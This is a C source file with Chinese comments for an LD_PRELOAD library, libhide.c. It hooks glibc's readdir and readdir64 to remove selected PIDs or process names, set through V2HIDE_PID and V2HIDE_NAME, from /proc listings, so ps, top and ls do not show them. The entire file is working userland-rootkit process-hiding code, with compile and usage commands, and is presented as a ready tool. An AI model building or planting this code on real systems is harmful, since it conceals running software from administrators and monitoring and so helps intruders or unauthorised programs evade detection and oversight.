/* libhide.c - LD_PRELOAD 用户态进程隐藏（无需 root、无需驱动，仅作对照/应急）
 *
 * 原理：hook glibc 的 readdir / readdir64，把 /proc 里的目标 pid 目录项过滤掉。
 * 局限：只对"动态链接 glibc 的调用者进程"生效（ps/top/ls/bash 都可以），
 *       对 Go 程序（直接走 getdents64 系统调用）和静态二进制无效。
 *
 * 用法：
 *   gcc -shared -fPIC -O2 -o libhide.so libhide.c -ldl
 *   V2HIDE_PID=1234 LD_PRELOAD=/usr/local/lib/libhide.so ps aux
 *   也可用 V2HIDE_NAME=v2nb,v2hide 按名字隐藏（逗号分隔）
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static struct dirent *(*real_readdir)(DIR *) = NULL;
static struct dirent64 *(*real_readdir64)(DIR *) = NULL;

static int name_hidden(const char *name)
{
	const char *pid;
	const char *list;
	char *copy, *tok, *save;

	if (!name)
		return 0;
	pid = getenv("V2HIDE_PID");
	if (pid && *pid && !strcmp(name, pid))
		return 1;
	list = getenv("V2HIDE_NAME");
	if (list && *list) {
		copy = strdup(list);
		if (!copy)
			return 0;
		for (tok = strtok_r(copy, ",", &save); tok; tok = strtok_r(NULL, ",", &save)) {
			if (!strcmp(name, tok)) {
				free(copy);
				return 1;
			}
		}
		free(copy);
	}
	return 0;
}

struct dirent *readdir(DIR *dirp)
{
	struct dirent *e;

	if (!real_readdir)
		real_readdir = dlsym(RTLD_NEXT, "readdir");
	if (!real_readdir)
		return NULL;
	while ((e = real_readdir(dirp)) != NULL) {
		if (!name_hidden(e->d_name))
			return e;
	}
	return NULL;
}

struct dirent64 *readdir64(DIR *dirp)
{
	struct dirent64 *e;

	if (!real_readdir64)
		real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	if (!real_readdir64)
		return NULL;
	while ((e = real_readdir64(dirp)) != NULL) {
		if (!name_hidden(e->d_name))
			return e;
	}
	return NULL;
}
